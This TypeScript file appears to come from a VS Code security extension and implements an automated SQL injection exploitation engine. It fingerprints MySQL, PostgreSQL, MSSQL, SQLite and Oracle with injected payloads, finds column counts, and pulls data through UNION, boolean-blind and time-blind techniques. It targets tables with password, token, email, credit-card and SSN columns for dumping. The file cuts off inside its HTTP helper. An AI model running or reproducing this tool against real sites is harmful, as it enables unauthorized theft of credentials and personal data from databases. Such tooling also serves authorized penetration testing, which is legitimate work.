/*---------------------------------------------------------------------------------------------
 *  Copyright (c) HikariSystem. All rights reserved.
 *  Licensed under the GPLv3 License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import * as vscode from 'vscode';

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

const DEFAULT_DELAY_MS = 150;
const DEFAULT_TIMEOUT_MS = 15_000;
const DEFAULT_MAX_ROWS = 50;
const TIME_BLIND_DELAY = 5;
const TIME_BLIND_THRESHOLD = 4;
const UNION_MAX_COLUMNS = 30;
const BLIND_CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-@.!#$%^&*()+=/ ';

// ---------------------------------------------------------------------------
// Public interfaces
// ---------------------------------------------------------------------------

export interface SqliExtractResult {
	generatedAt: string;
	target: string;
	parameter: string;
	dbms: string;
	technique: 'union' | 'boolean-blind' | 'time-blind';
	databases: string[];
	tables: Array<{ database: string; table: string }>;
	columns: Array<{ database: string; table: string; column: string }>;
	extractedData: Array<{ table: string; columns: string[]; rows: string[][] }>;
	elapsedMs: number;
}

interface ParameterTarget {
	name: string;
	location: 'query' | 'body';
}

// ---------------------------------------------------------------------------
// DBMS-specific query providers
// ---------------------------------------------------------------------------

interface DbmsQueries {
	versionQuery: string;
	currentDbQuery: string;
	databasesQuery: string;
	tablesQuery(db: string): string;
	columnsQuery(db: string, table: string): string;
	dataQuery(db: string, table: string, columns: string[], limit: number, offset: number): string;
	/** Return an expression that yields a single concatenated string for union-based extraction */
	concatExpr(columns: string[]): string;
	blindLength(subquery: string): string;
	blindCharAt(subquery: string, pos: number): string;
	timeSleep(seconds: number): string;
}

const MYSQL_QUERIES: DbmsQueries = {
	versionQuery: 'VERSION()',
	currentDbQuery: 'DATABASE()',
	databasesQuery: 'SELECT GROUP_CONCAT(schema_name SEPARATOR 0x7c) FROM information_schema.schemata',
	tablesQuery: (db) => `SELECT GROUP_CONCAT(table_name SEPARATOR 0x7c) FROM information_schema.tables WHERE table_schema='${db}'`,
	columnsQuery: (db, table) => `SELECT GROUP_CONCAT(column_name SEPARATOR 0x7c) FROM information_schema.columns WHERE table_schema='${db}' AND table_name='${table}'`,
	dataQuery: (db, table, columns, limit, offset) =>
		`SELECT GROUP_CONCAT(${columns.join(`,0x3a,`)} SEPARATOR 0x7c7c) FROM ${db}.${table} LIMIT ${limit} OFFSET ${offset}`,
	concatExpr: (cols) => `CONCAT(${cols.join(',0x3a,')})`,
	blindLength: (sub) => `LENGTH((${sub}))`,
	blindCharAt: (sub, pos) => `ASCII(SUBSTRING((${sub}),${pos},1))`,
	timeSleep: (s) => `SLEEP(${s})`,
};

const POSTGRESQL_QUERIES: DbmsQueries = {
	versionQuery: 'version()',
	currentDbQuery: 'current_database()',
	databasesQuery: `SELECT string_agg(datname,'|') FROM pg_database WHERE datistemplate=false`,
	tablesQuery: (db) => `SELECT string_agg(table_name,'|') FROM information_schema.tables WHERE table_catalog='${db}' AND table_schema='public'`,
	columnsQuery: (db, table) => `SELECT string_agg(column_name,'|') FROM information_schema.columns WHERE table_catalog='${db}' AND table_name='${table}'`,
	dataQuery: (db, table, columns, limit, offset) =>
		`SELECT string_agg(${columns.join(`||':'||`)},'||') FROM ${table} LIMIT ${limit} OFFSET ${offset}`,
	concatExpr: (cols) => cols.join(`||':'||`),
	blindLength: (sub) => `LENGTH((${sub}))`,
	blindCharAt: (sub, pos) => `ASCII(SUBSTRING((${sub}),${pos},1))`,
	timeSleep: (s) => `pg_sleep(${s})`,
};

const MSSQL_QUERIES: DbmsQueries = {
	versionQuery: '@@VERSION',
	currentDbQuery: 'DB_NAME()',
	databasesQuery: `SELECT STUFF((SELECT '|'+name FROM sys.databases FOR XML PATH('')),1,1,'')`,
	tablesQuery: (db) => `SELECT STUFF((SELECT '|'+name FROM ${db}..sysobjects WHERE xtype='U' FOR XML PATH('')),1,1,'')`,
	columnsQuery: (db, table) => `SELECT STUFF((SELECT '|'+name FROM ${db}..syscolumns WHERE id=OBJECT_ID('${db}..${table}') FOR XML PATH('')),1,1,'')`,
	dataQuery: (db, table, columns, limit, offset) =>
		`SELECT STUFF((SELECT '||'+${columns.join(`+':'+`)} FROM (SELECT ${columns.join(',')}, ROW_NUMBER() OVER (ORDER BY (SELECT 1)) AS rn FROM ${db}..${table}) t WHERE rn BETWEEN ${offset + 1} AND ${offset + limit} FOR XML PATH('')),1,2,'')`,
	concatExpr: (cols) => cols.join(`+':'+`),
	blindLength: (sub) => `LEN((${sub}))`,
	blindCharAt: (sub, pos) => `ASCII(SUBSTRING((${sub}),${pos},1))`,
	timeSleep: (s) => `WAITFOR DELAY '0:0:${s}'`,
};

const SQLITE_QUERIES: DbmsQueries = {
	versionQuery: 'sqlite_version()',
	currentDbQuery: `'main'`,
	databasesQuery: `SELECT GROUP_CONCAT(name,'|') FROM pragma_database_list`,
	tablesQuery: (_db) => `SELECT GROUP_CONCAT(name,'|') FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'`,
	columnsQuery: (_db, table) => `SELECT GROUP_CONCAT(name,'|') FROM pragma_table_info('${table}')`,
	dataQuery: (_db, table, columns, limit, offset) =>
		`SELECT GROUP_CONCAT(${columns.join(`||':'||`)},'||') FROM ${table} LIMIT ${limit} OFFSET ${offset}`,
	concatExpr: (cols) => cols.join(`||':'||`),
	blindLength: (sub) => `LENGTH((${sub}))`,
	blindCharAt: (sub, pos) => `UNICODE(SUBSTR((${sub}),${pos},1))`,
	timeSleep: (_s) => `LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(150000000/2))))`, // SQLite has no sleep; heavy computation
};

const ORACLE_QUERIES: DbmsQueries = {
	versionQuery: `banner FROM v$version WHERE ROWNUM=1--`,
	currentDbQuery: `SYS_CONTEXT('USERENV','DB_NAME') FROM dual`,
	databasesQuery: `SELECT LISTAGG(username,'|') WITHIN GROUP (ORDER BY username) FROM all_users`,
	tablesQuery: (db) => `SELECT LISTAGG(table_name,'|') WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE owner=UPPER('${db}')`,
	columnsQuery: (db, table) => `SELECT LISTAGG(column_name,'|') WITHIN GROUP (ORDER BY column_id) FROM all_tab_columns WHERE owner=UPPER('${db}') AND table_name=UPPER('${table}')`,
	dataQuery: (db, table, columns, limit, offset) =>
		`SELECT LISTAGG(${columns.join(`||':'||`)},'||') WITHIN GROUP (ORDER BY ROWNUM) FROM (SELECT ${columns.join(',')}, ROWNUM rn FROM ${db}.${table}) WHERE rn BETWEEN ${offset + 1} AND ${offset + limit}`,
	concatExpr: (cols) => cols.join(`||':'||`),
	blindLength: (sub) => `LENGTH((${sub}))`,
	blindCharAt: (sub, pos) => `ASCII(SUBSTR((${sub}),${pos},1))`,
	timeSleep: (s) => `DBMS_LOCK.SLEEP(${s})`,
};

function getDbmsQueries(dbms: string): DbmsQueries {
	switch (dbms.toLowerCase()) {
		case 'mysql': return MYSQL_QUERIES;
		case 'postgresql': return POSTGRESQL_QUERIES;
		case 'mssql': return MSSQL_QUERIES;
		case 'sqlite': return SQLITE_QUERIES;
		case 'oracle': return ORACLE_QUERIES;
		default: return MYSQL_QUERIES;
	}
}

// ---------------------------------------------------------------------------
// DB fingerprinting
// ---------------------------------------------------------------------------

const FINGERPRINT_PATTERNS: Array<{ dbms: string; patterns: RegExp[] }> = [
	{
		dbms: 'mysql',
		patterns: [
			/you have an error in your sql syntax/i,
			/warning.*?\bmysql/i,
			/MySqlException/i,
			/com\.mysql\.jdbc/i,
			/MariaDB/i,
			/SQL syntax.*?MySQL/i,
		],
	},
	{
		dbms: 'postgresql',
		patterns: [
			/PostgreSQL.*?ERROR/i,
			/Warning.*?\bpg_/i,
			/valid PostgreSQL result/i,
			/Npgsql/i,
			/PG::SyntaxError/i,
			/org\.postgresql/i,
		],
	},
	{
		dbms: 'mssql',
		patterns: [
			/Driver.*?SQL[\s-]*Server/i,
			/OLE DB.*?SQL Server/i,
			/\bSQL Server\b.*?\bDriver/i,
			/Warning.*?\b(mssql|sqlsrv)/i,
			/\bSQL Server\b.*?Error/i,
			/Microsoft SQL Native Client error/i,
		],
	},
	{
		dbms: 'sqlite',
		patterns: [
			/SQLite\/JDBCDriver/i,
			/SQLite\.Exception/i,
			/System\.Data\.SQLite\.SQLiteException/i,
			/Warning.*?\bsqlite_/i,
			/Warning.*?\bSQLite3::/i,
			/\[SQLITE_ERROR\]/i,
			/SQLITE_MISUSE/i,
		],
	},
	{
		dbms: 'oracle',
		patterns: [
			/\bORA-\d{5}/i,
			/Oracle error/i,
			/Oracle.*?Driver/i,
			/Warning.*?\b(oci_|ora_)/i,
			/quoted string not properly terminated/i,
			/SQL command not properly ended/i,
		],
	},
];

const VERSION_PAYLOADS: Array<{ dbms: string; payload: string; match: RegExp }> = [
	{ dbms: 'mysql', payload: `' AND 1=CONVERT(@@version USING utf8)-- -`, match: /^[\d]+\.[\d]+\.[\d]+/ },
	{ dbms: 'mysql', payload: `' OR 1=1 AND VERSION() LIKE '%'-- -`, match: /mysql|mariadb/i },
	{ dbms: 'postgresql', payload: `' AND 1=CAST(version() AS int)-- -`, match: /PostgreSQL/i },
	{ dbms: 'mssql', payload: `' AND 1=CONVERT(int,@@version)-- -`, match: /Microsoft SQL Server/i },
	{ dbms: 'sqlite', payload: `' AND 1=CAST(sqlite_version() AS int)-- -`, match: /library routine called/i },
	{ dbms: 'oracle', payload: `' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))-- -`, match: /ORA-/i },
];

async function fingerprint(
	targetUrl: string,
	param: ParameterTarget,
	timeoutMs: number,
	headers?: Record<string, string>,
	cookie?: string,
): Promise<string> {
	// Phase 1: Send a simple error-inducing payload and match error patterns
	const errorPayloads = [`'`, `''`, `' OR '1'='1`, `1 OR 1=1`, `' AND '1'='2`];
	for (const payload of errorPayloads) {
		const response = await sendWithPayload(targetUrl, param, payload, timeoutMs, headers, cookie);
		if (!response) { continue; }
		for (const fp of FINGERPRINT_PATTERNS) {
			for (const pattern of fp.patterns) {
				if (pattern.test(response.bodyText)) {
					return fp.dbms;
				}
			}
		}
	}

	// Phase 2: Version-specific payloads
	for (const vp of VERSION_PAYLOADS) {
		const response = await sendWithPayload(targetUrl, param, vp.payload, timeoutMs, headers, cookie);
		if (!response) { continue; }
		if (vp.match.test(response.bodyText)) {
			return vp.dbms;
		}
	}

	return 'mysql'; // Default assumption
}

// ---------------------------------------------------------------------------
// UNION-based extraction
// ---------------------------------------------------------------------------

async function detectColumnCount(
	targetUrl: string,
	param: ParameterTarget,
	timeoutMs: number,
	delayMs: number,
	headers?: Record<string, string>,
	cookie?: string,
): Promise<number> {
	// ORDER BY incremental
	for (let n = 1; n <= UNION_MAX_COLUMNS; n++) {
		const payload = `' ORDER BY ${n}-- -`;
		const response = await sendWithPayload(targetUrl, param, payload, timeoutMs, headers, cookie);
		if (!response) { continue; }

		// If we get an error at column n, then n-1 is the count
		const isError = /unknown column|order by|ORDER BY|invalid|out of range|error/i.test(response.bodyText);
		if (isError && n > 1) {
			return n - 1;
		}

		if (delayMs > 0) { await sleep(delayMs); }
	}

	// Fallback: try UNION SELECT NULL approach
	for (let n = 1; n <= UNION_MAX_COLUMNS; n++) {
		const nulls = Array.from({ length: n }, () => 'NULL').join(',');
		const payload = `' UNION SELECT ${nulls}-- -`;
		const response = await sendWithPayload(targetUrl, param, payload, timeoutMs, headers, cookie);
		if (!response) { continue; }

		// Successful union means no error
		const hasError = /number of columns|do not match|different number|UNION.*?column/i.test(response.bodyText);
		if (!hasError && response.statusCode < 500) {
			return n;
		}

		if (delayMs > 0) { await sleep(delayMs); }
	}

	return 0;
}

function findReflectedColumn(body: string, columnCount: number, marker: string): number {
	for (let i = 0; i < columnCount; i++) {
		if (body.includes(`${marker}${i}`)) {
			return i;
		}
	}
	return -1;
}

async function unionExtract(
	targetUrl: string,
	param: ParameterTarget,
	columnCount: number,
	query: string,
	timeoutMs: number,
	headers?: Record<string, string>,
	cookie?: string,
): Promise<string | null> {
	const marker = `scylla_sqli_${Math.random().toString(36).slice(2, 8)}`;

	// Find which column reflects in response
	const cols = Array.from({ length: columnCount }, (_, i) => `'${marker}${i}'`);
	const findPayload = `' UNION SELECT ${cols.join(',')}-- -`;
	const findResponse = await sendWithPayload(targetUrl, param, findPayload, timeoutMs, headers, cookie);
	if (!findResponse) { return null; }

	const reflectedIdx = findReflectedColumn(findResponse.bodyText, columnCount, marker);
	if (reflectedIdx < 0) { return null; }

	// Now inject actual query in the reflected column
	const extractCols = Array.from({ length: columnCount }, (_, i) =>
		i === reflectedIdx ? `(${query})` : 'NULL'
	);
	const extractPayload = `' UNION SELECT ${extractCols.join(',')}-- -`;
	const response = await sendWithPayload(targetUrl, param, extractPayload, timeoutMs, headers, cookie);
	if (!response) { return null; }

	// Extract the data between known markers: look for query output
	// We surround with known markers for reliable extraction
	const markerCols = Array.from({ length: columnCount }, (_, i) =>
		i === reflectedIdx ? `CONCAT('${marker}[',(${query}),']${marker}')` : 'NULL'
	);
	const markerPayload = `' UNION SELECT ${markerCols.join(',')}-- -`;
	const markerResponse = await sendWithPayload(targetUrl, param, markerPayload, timeoutMs, headers, cookie);
	if (!markerResponse) {
		// Fallback: try without CONCAT (for non-MySQL)
		return extractFromBody(response.bodyText, findResponse.bodyText);
	}

	const startTag = `${marker}[`;
	const endTag = `]${marker}`;
	const startIdx = markerResponse.bodyText.indexOf(startTag);
	const endIdx = markerResponse.bodyText.indexOf(endTag, startIdx);
	if (startIdx >= 0 && endIdx > startIdx) {
		return markerResponse.bodyText.substring(startIdx + startTag.length, endIdx);
	}

	return extractFromBody(response.bodyText, findResponse.bodyText);
}

function extractFromBody(injectedBody: string, baselineBody: string): string | null {
	// Diff-based extraction: find content present in injected but not baseline
	const injectedLines = new Set(injectedBody.split('\n').map(l => l.trim()));
	const baselineLines = new Set(baselineBody.split('\n').map(l => l.trim()));
	const diff: string[] = [];
	for (const line of injectedLines) {
		if (line.length > 0 && !baselineLines.has(line)) {
			diff.push(line);
		}
	}
	return diff.length > 0 ? diff.join('\n') : null;
}

async function unionExtractAll(
	targetUrl: string,
	param: ParameterTarget,
	dbms: string,
	columnCount: number,
	maxRows: number,
	timeoutMs: number,
	delayMs: number,
	headers?: Record<string, string>,
	cookie?: string,
): Promise<{
	databases: string[];
	tables: Array<{ database: string; table: string }>;
	columns: Array<{ database: string; table: string; column: string }>;
	extractedData: Array<{ table: string; columns: string[]; rows: string[][] }>;
}> {
	const q = getDbmsQueries(dbms);
	const databases: string[] = [];
	const tables: Array<{ database: string; table: string }> = [];
	const columns: Array<{ database: string; table: string; column: string }> = [];
	const extractedData: Array<{ table: string; columns: string[]; rows: string[][] }> = [];

	// 1. Extract current database
	const currentDb = await unionExtract(targetUrl, param, columnCount, q.currentDbQuery, timeoutMs, headers, cookie);
	if (delayMs > 0) { await sleep(delayMs); }

	// 2. Extract all database names
	const dbRaw = await unionExtract(targetUrl, param, columnCount, q.databasesQuery, timeoutMs, headers, cookie);
	if (dbRaw) {
		databases.push(...dbRaw.split('|').filter(Boolean));
	} else if (currentDb) {
		databases.push(currentDb);
	}
	if (delayMs > 0) { await sleep(delayMs); }

	// 3. Extract tables from each database
	const targetDbs = databases.length > 0 ? databases.slice(0, 5) : (currentDb ? [currentDb] : []);
	for (const db of targetDbs) {
		const tablesRaw = await unionExtract(targetUrl, param, columnCount, q.tablesQuery(db), timeoutMs, headers, cookie);
		if (tablesRaw) {
			for (const t of tablesRaw.split('|').filter(Boolean)) {
				tables.push({ database: db, table: t });
			}
		}
		if (delayMs > 0) { await sleep(delayMs); }
	}

	// 4. Extract columns from discovered tables (limit to first 10 tables)
	for (const t of tables.slice(0, 10)) {
		const colsRaw = await unionExtract(targetUrl, param, columnCount, q.columnsQuery(t.database, t.table), timeoutMs, headers, cookie);
		if (colsRaw) {
			for (const c of colsRaw.split('|').filter(Boolean)) {
				columns.push({ database: t.database, table: t.table, column: c });
			}
		}
		if (delayMs > 0) { await sleep(delayMs); }
	}

	// 5. Extract data from tables with interesting-looking columns
	const interestingPatterns = /pass|pwd|secret|token|key|email|user|admin|credit|ssn|hash|salt|api/i;
	const interestingTables = tables.filter(t =>
		columns.some(c => c.database === t.database && c.table === t.table && interestingPatterns.test(c.column))
	);

	for (const t of interestingTables.slice(0, 5)) {
		const tableCols = columns
			.filter(c => c.database === t.database && c.table === t.table)
			.map(c => c.column)
			.slice(0, 10);

		if (tableCols.length === 0) { continue; }

		const dataRaw = await unionExtract(
			targetUrl, param, columnCount,
			q.dataQuery(t.database, t.table, tableCols, maxRows, 0),
			timeoutMs, headers, cookie,
		);
		if (dataRaw) {
			const rows = dataRaw.split('||').filter(Boolean).map(row => row.split(':'));
			extractedData.push({ table: `${t.database}.${t.table}`, columns: tableCols, rows });
		}
		if (delayMs > 0) { await sleep(delayMs); }
	}

	return { databases, tables, columns, extractedData };
}

// ---------------------------------------------------------------------------
// Boolean-blind extraction
// ---------------------------------------------------------------------------

async function booleanBlindExtractValue(
	targetUrl: string,
	param: ParameterTarget,
	dbms: string,
	subquery: string,
	timeoutMs: number,
	delayMs: number,
	headers?: Record<string, string>,
	cookie?: string,
): Promise<string> {
	const q = getDbmsQueries(dbms);

	// Get baseline responses for true/false conditions
	const truePayload = `' AND 1=1-- -`;
	const falsePayload = `' AND 1=2-- -`;
	const trueResp = await sendWithPayload(targetUrl, param, truePayload, timeoutMs, headers, cookie);
	const falseResp = await sendWithPayload(targetUrl, param, falsePayload, timeoutMs, headers, cookie);
	if (!trueResp || !falseResp) { return ''; }
	const trueLen = trueResp.bodyText.length;
	const falseLen = falseResp.bodyText.length;

	// Determine which response property to compare
	const useLength = Math.abs(trueLen - falseLen) > 20;

	const isTrue = (resp: { bodyText: string; statusCode: number }): boolean => {
		if (useLength) {
			return Math.abs(resp.bodyText.length - trueLen) < Math.abs(resp.bodyText.length - falseLen);
		}
		return resp.bodyText === trueResp.bodyText || resp.statusCode === trueResp.statusCode;
	};

	// First, determine the length of the value
	let valueLength = 0;
	for (let len = 1; len <= 256; len++) {
		const payload = `' AND (${q.blindLength(subquery)})=${len}-- -`;
		const resp = await sendWithPayload(targetUrl, param, payload, timeoutMs, headers, cookie);
		if (resp && isTrue(resp)) {
			valueLength = len;
			break;
		}
		// Binary search for length if linear is too slow
		if (len === 20 && valueLength === 0) {
			valueLength = await binarySearchLength(targetUrl, param, q, subquery, timeoutMs, headers, cookie, isTrue);
			break;
		}
		if (delayMs > 0) { await sleep(delayMs); }
	}

	if (valueLength === 0) { return ''; }

	// Extract character by character using binary search
	let result = '';
	for (let pos = 1; pos <= valueLength; pos++) {
		const charCode = await binarySearchChar(
			targetUrl, param, q, subquery, pos, timeoutMs, headers, cookie, isTrue
		);
		if (charCode > 0) {
			result += String.fromCharCode(charCode);
		}
		if (delayMs > 0) { await sleep(delayMs); }
	}

	return result;
}

async function binarySearchLength(
	targetUrl: string,
	param: ParameterTarget,
	q: DbmsQueries,
	subquery: string,
	timeoutMs: number,
	headers: Record<string, string> | undefined,
	cookie: string | undefined,
	isTrue: (resp: { bodyText: string; statusCode: number }) => boolean,
): Promise<number> {
	let low = 1;
	let high = 256;

	while (low <= high) {
		const mid = Math.floor((low + high) / 2);
		const payload = `' AND (${q.blindLength(subquery)})>${mid}-- -`;
		const resp = await sendWithPayload(targetUrl, param, payload, timeoutMs, headers, cookie);
		if (!resp) { return 0; }

		if (isTrue(resp)) {
			low = mid + 1;
		} else {
			high = mid - 1;
		}
	}

	// Verify
	const verifyPayload = `' AND (${q.blindLength(subquery)})=${low}-- -`;
	const verifyResp = await sendWithPayload(targetUrl, param, verifyPayload, timeoutMs, headers, cookie);
	if (verifyResp && isTrue(verifyResp)) { return low; }

	return high >= 0 ? high : 0;
}

async function binarySearchChar(
	targetUrl: string,
	param: ParameterTarget,
	q: DbmsQueries,
	subquery: string,
	pos: number,
	timeoutMs: number,
	headers: Record<string, string> | undefined,
	cookie: string | undefined,
	isTrue: (resp: { bodyText: string; statusCode: number }) => boolean,
): Promise<number> {
	let low = 32;
	let high = 126;

	while (low <= high) {
		const mid = Math.floor((low + high) / 2);
		const payload = `' AND (${q.blindCharAt(subquery, pos)})>${mid}-- -`;
		const resp = await sendWithPayload(targetUrl, param, payload, timeoutMs, headers, cookie);
		if (!resp) { return 0; }

		if (isTrue(resp)) {
			low = mid + 1;
		} else {
			high = mid - 1;
		}
	}

	return low <= 126 ? low : 0;
}

async function booleanBlindExtractAll(
	targetUrl: string,
	param: ParameterTarget,
	dbms: string,
	maxRows: number,
	timeoutMs: number,
	delayMs: number,
	headers?: Record<string, string>,
	cookie?: string,
): Promise<{
	databases: string[];
	tables: Array<{ database: string; table: string }>;
	columns: Array<{ database: string; table: string; column: string }>;
	extractedData: Array<{ table: string; columns: string[]; rows: string[][] }>;
}> {
	const q = getDbmsQueries(dbms);
	const databases: string[] = [];
	const tables: Array<{ database: string; table: string }> = [];
	const columns: Array<{ database: string; table: string; column: string }> = [];
	const extractedData: Array<{ table: string; columns: string[]; rows: string[][] }> = [];

	// Extract current database
	const currentDb = await booleanBlindExtractValue(targetUrl, param, dbms, q.currentDbQuery, timeoutMs, delayMs, headers, cookie);
	if (currentDb) { databases.push(currentDb); }

	// Extract databases
	const dbsRaw = await booleanBlindExtractValue(targetUrl, param, dbms, q.databasesQuery, timeoutMs, delayMs, headers, cookie);
	if (dbsRaw) {
		for (const db of dbsRaw.split('|').filter(Boolean)) {
			if (!databases.includes(db)) { databases.push(db); }
		}
	}

	// Extract tables (limit to first 3 databases for blind, it's slow)
	const targetDbs = databases.slice(0, 3);
	for (const db of targetDbs) {
		const tablesRaw = await booleanBlindExtractValue(targetUrl, param, dbms, q.tablesQuery(db), timeoutMs, delayMs, headers, cookie);
		if (tablesRaw) {
			for (const t of tablesRaw.split('|').filter(Boolean)) {
				tables.push({ database: db, table: t });
			}
		}
	}

	// Extract columns (limit to first 5 tables)
	for (const t of tables.slice(0, 5)) {
		const colsRaw = await booleanBlindExtractValue(targetUrl, param, dbms, q.columnsQuery(t.database, t.table), timeoutMs, delayMs, headers, cookie);
		if (colsRaw) {
			for (const c of colsRaw.split('|').filter(Boolean)) {
				columns.push({ database: t.database, table: t.table, column: c });
			}
		}
	}

	// Extract data from interesting tables (very limited for blind)
	const interestingPatterns = /pass|pwd|secret|token|key|email|user|admin|hash/i;
	const interestingTables = tables.filter(t =>
		columns.some(c => c.database === t.database && c.table === t.table && interestingPatterns.test(c.column))
	);

	for (const t of interestingTables.slice(0, 2)) {
		const tableCols = columns
			.filter(c => c.database === t.database && c.table === t.table)
			.map(c => c.column)
			.slice(0, 5);
		if (tableCols.length === 0) { continue; }

		const rows: string[][] = [];
		for (let offset = 0; offset < Math.min(maxRows, 10); offset++) {
			const dataRaw = await booleanBlindExtractValue(
				targetUrl, param, dbms,
				q.dataQuery(t.database, t.table, tableCols, 1, offset),
				timeoutMs, delayMs, headers, cookie,
			);
			if (!dataRaw) { break; }
			rows.push(dataRaw.split(':'));
		}
		if (rows.length > 0) {
			extractedData.push({ table: `${t.database}.${t.table}`, columns: tableCols, rows });
		}
	}

	return { databases, tables, columns, extractedData };
}

// ---------------------------------------------------------------------------
// Time-blind extraction
// ---------------------------------------------------------------------------

async function timeBlindExtractValue(
	targetUrl: string,
	param: ParameterTarget,
	dbms: string,
	subquery: string,
	timeoutMs: number,
	delayMs: number,
	headers?: Record<string, string>,
	cookie?: string,
): Promise<string> {
	const q = getDbmsQueries(dbms);

	// Get baseline response time
	let baselineTotal = 0;
	for (let i = 0; i < 3; i++) {
		const resp = await sendWithPayload(targetUrl, param, 'scylla_baseline', timeoutMs, headers, cookie);
		baselineTotal += resp?.elapsedMs ?? 500;
	}
	const baseline = baselineTotal / 3;

	const isDelayed = (elapsedMs: number): boolean => {
		return (elapsedMs - baseline) >= TIME_BLIND_THRESHOLD * 1000;
	};

	// Determine length
	let valueLength = 0;
	for (let len = 1; len <= 128; len++) {
		const condition = `(${q.blindLength(subquery)})=${len}`;
		const payload = `' AND IF(${condition},${q.timeSleep(TIME_BLIND_DELAY)},0)-- -`;
		const resp = await sendWithPayload(
			targetUrl, param, payload, timeoutMs + TIME_BLIND_DELAY * 1000 + 5000, headers, cookie
		);
		if (resp && isDelayed(resp.elapsedMs)) {
			valueLength = len;
			break;
		}
		// Switch to binary search if linear takes too long
		if (len === 15 && valueLength === 0) {
			valueLength = await timeBlindBinarySearchLength(
				targetUrl, param, q, subquery, timeoutMs, baseline, headers, cookie
			);
			break;
		}
		if (delayMs > 0) { await sleep(delayMs); }
	}

	if (valueLength === 0) { return ''; }

	// Extract char by char
	let result = '';
	for (let pos = 1; pos <= valueLength; pos++) {
		const charCode = await timeBlindBinarySearchChar(
			targetUrl, param, q, subquery, pos, timeoutMs, baseline, headers, cookie
		);
		if (charCode > 0) {
			result += String.fromCharCode(charCode);
		}
		if (delayMs > 0) { await sleep(delayMs); }
	}

	return result;
}

async function timeBlindBinarySearchLength(
	targetUrl: string,
	param: ParameterTarget,
	q: DbmsQueries,
	subquery: string,
	timeoutMs: number,
	baseline: number,
	headers?: Record<string, string>,
	cookie?: string,
): Promise<number> {
	let low = 1;
	let high = 128;

	while (low <= high) {
		const mid = Math.floor((low + high) / 2);
		const condition = `(${q.blindLength(subquery)})>${mid}`;
		const payload = `' AND IF(${condition},${q.timeSleep(TIME_BLIND_DELAY)},0)-- -`;
		const resp = await sendWithPayload(
			targetUrl, param, payload, timeoutMs + TIME_BLIND_DELAY * 1000 + 5000, headers, cookie
		);
		if (!resp) { return 0; }

		if ((resp.elapsedMs - baseline) >= TIME_BLIND_THRESHOLD * 1000) {
			low = mid + 1;
		} else {
			high = mid - 1;
		}
	}

	return low;
}

async function timeBlindBinarySearchChar(
	targetUrl: string,
	param: ParameterTarget,
	q: DbmsQueries,
	subquery: string,
	pos: number,
	timeoutMs: number,
	baseline: number,
	headers?: Record<string, string>,
	cookie?: string,
): Promise<number> {
	let low = 32;
	let high = 126;

	while (low <= high) {
		const mid = Math.floor((low + high) / 2);
		const condition = `(${q.blindCharAt(subquery, pos)})>${mid}`;
		const payload = `' AND IF(${condition},${q.timeSleep(TIME_BLIND_DELAY)},0)-- -`;
		const resp = await sendWithPayload(
			targetUrl, param, payload, timeoutMs + TIME_BLIND_DELAY * 1000 + 5000, headers, cookie
		);
		if (!resp) { return 0; }

		if ((resp.elapsedMs - baseline) >= TIME_BLIND_THRESHOLD * 1000) {
			low = mid + 1;
		} else {
			high = mid - 1;
		}
	}

	return low <= 126 ? low : 0;
}

async function timeBlindExtractAll(
	targetUrl: string,
	param: ParameterTarget,
	dbms: string,
	maxRows: number,
	timeoutMs: number,
	delayMs: number,
	headers?: Record<string, string>,
	cookie?: string,
): Promise<{
	databases: string[];
	tables: Array<{ database: string; table: string }>;
	columns: Array<{ database: string; table: string; column: string }>;
	extractedData: Array<{ table: string; columns: string[]; rows: string[][] }>;
}> {
	const q = getDbmsQueries(dbms);
	const databases: string[] = [];
	const tables: Array<{ database: string; table: string }> = [];
	const columns: Array<{ database: string; table: string; column: string }> = [];
	const extractedData: Array<{ table: string; columns: string[]; rows: string[][] }> = [];

	// Extract current database
	const currentDb = await timeBlindExtractValue(targetUrl, param, dbms, q.currentDbQuery, timeoutMs, delayMs, headers, cookie);
	if (currentDb) { databases.push(currentDb); }

	// Extract databases
	const dbsRaw = await timeBlindExtractValue(targetUrl, param, dbms, q.databasesQuery, timeoutMs, delayMs, headers, cookie);
	if (dbsRaw) {
		for (const db of dbsRaw.split('|').filter(Boolean)) {
			if (!databases.includes(db)) { databases.push(db); }
		}
	}

	// Extract tables (limit to 2 databases for time-blind, extremely slow)
	for (const db of databases.slice(0, 2)) {
		const tablesRaw = await timeBlindExtractValue(targetUrl, param, dbms, q.tablesQuery(db), timeoutMs, delayMs, headers, cookie);
		if (tablesRaw) {
			for (const t of tablesRaw.split('|').filter(Boolean)) {
				tables.push({ database: db, table: t });
			}
		}
	}

	// Extract columns (limit to 3 tables)
	for (const t of tables.slice(0, 3)) {
		const colsRaw = await timeBlindExtractValue(targetUrl, param, dbms, q.columnsQuery(t.database, t.table), timeoutMs, delayMs, headers, cookie);
		if (colsRaw) {
			for (const c of colsRaw.split('|').filter(Boolean)) {
				columns.push({ database: t.database, table: t.table, column: c });
			}
		}
	}

	// Extract data from high-value tables only (limited for time-blind)
	const interestingPatterns = /pass|pwd|secret|token|key|email|user|admin|hash/i;
	const interestingTables = tables.filter(t =>
		columns.some(c => c.database === t.database && c.table === t.table && interestingPatterns.test(c.column))
	);

	for (const t of interestingTables.slice(0, 1)) {
		const tableCols = columns
			.filter(c => c.database === t.database && c.table === t.table)
			.map(c => c.column)
			.slice(0, 3);
		if (tableCols.length === 0) { continue; }

		const rows: string[][] = [];
		for (let offset = 0; offset < Math.min(maxRows, 5); offset++) {
			const dataRaw = await timeBlindExtractValue(
				targetUrl, param, dbms,
				q.dataQuery(t.database, t.table, tableCols, 1, offset),
				timeoutMs, delayMs, headers, cookie,
			);
			if (!dataRaw) { break; }
			rows.push(dataRaw.split(':'));
		}
		if (rows.length > 0) {
			extractedData.push({ table: `${t.database}.${t.table}`, columns: tableCols, rows });
		}
	}

	return { databases, tables, columns, extractedData };
}

// ---------------------------------------------------------------------------
// HTTP helper
// ---------------------------------------------------------------------------

async function sendWithPayload(
	targetUrl: string,
	param: ParameterTarget,
	payload: string,
	timeoutMs: number,
	headers?: Record<string, string>,
	cookie?: string,
): Promise<{ bodyText: string; elapsedMs: number; statusCode: number } | null> {
	try {
		const url = new URL(targetUrl);

		const sendOptions: Record<string, unknown> = {
			timeoutMs,
